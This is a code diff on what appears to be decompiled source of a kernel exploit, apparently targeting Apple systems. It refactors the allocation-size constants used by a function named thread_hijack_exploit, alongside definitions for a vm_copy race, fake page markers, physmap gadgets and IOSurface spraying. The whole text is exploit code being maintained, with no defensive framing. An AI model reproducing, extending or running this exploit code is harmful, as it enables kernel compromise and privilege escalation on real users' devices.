@@ -1744,6 +1744,12 @@ struct physmap_gadget_table
   uint64_t vmFirstPhysPaddr;
 };
 
+struct thread_hijack_allocation_candidate
+{
+  uint64_t size;
+  uint64_t pageCount;
+};
+
 static const integer_t kVmcopyRaceLowPriorityPolicy[4] = { 0x20A51, 0x2710, 0x2711, 1 };
 static const integer_t kVmcopyRaceHighPriorityPolicy[4] = { 0x3E8, 0xF4240, 0xF4241, 1 };
 static const uint64_t kVmcopyFakePageMarkers[2] = { 0x43434343, 0x44444444 };
@@ -1751,6 +1757,11 @@ static const uint64_t kVmcopyFakePageMarkers[2] = { 0x43434343, 0x44444444 };
 static const integer_t kThreadHijackReadyPolicy[4] = { 0x960, 0x960, 0x961, 1 };
 static const integer_t kThreadHijackMainPolicy[4] = { 0x2710, 0xF4240, 0xF4241, 1 };
 static const uint64_t kIokitAllocPageAndCount[2] = { 0x4000, 4 };
+static const struct thread_hijack_allocation_candidate kThreadHijackAllocCandidates[3] = {
+  { 0x40000000, 2 },
+  { 0x30000000, 2 },
+  { 0x20000000, 0 },
+};
 
 #define SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(dst) \
   do { \
@@ -1867,8 +1878,6 @@ __int128 xmmword_431D0 = IDA_INT128_C(0x0000000000300000ULL, 0x00000000000003C4U
 __int128 xmmword_431E0 = IDA_INT128_C(0x0000000000300000ULL, 0x00000000000003C5ULL); // weak
 __int128 xmmword_431F0 = IDA_INT128_C(0x0000000000000000ULL, 0xFFFFFFFF80000000ULL); // weak
 __int128 xmmword_43200 = IDA_INT128_C(0x0000001000000000ULL, 0x4000000100000001ULL); // weak
-uint64_t qword_43378[3] = { 1073741824LL, 805306368LL, 536870912LL }; // weak
-unsigned int dword_43390[3] = { 2u, 2u, 0u }; // weak
 unsigned int dword_4339C[] = { 0, 1, 2, 3, 4, 5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
     0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
     0xFFFFFFFF, 0xFFFFFFFF, 3, 0, 1, 2, 2, 0, 1, 4, 4,
@@ -17978,8 +17987,8 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   v21 = 0;
   do
   {
-    v22 = qword_43378[v21];
-    v23 = dword_43390[v21];
+    v22 = kThreadHijackAllocCandidates[v21].size;
+    v23 = kThreadHijackAllocCandidates[v21].pageCount;
     *(uint64_t *)&v57 = (v22 + 0x3FFF) & 0xFFFFFFFFFFFFC000LL;
     *((uint64_t *)&v57 + 1) = v23;
     v24 = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
@@ -18092,8 +18101,6 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   return 0;
 }
 // 20: using guessed type segment_command_64 stru_20;
-// 43378: using guessed type uint64_t qword_43378[3];
-// 43390: using guessed type unsigned int dword_43390[3];
 // 48080: using guessed type __int64 qword_48080;
 // 48088: using guessed type __int64 qword_48088;
 // 48090: using guessed type __int64 qword_48090;
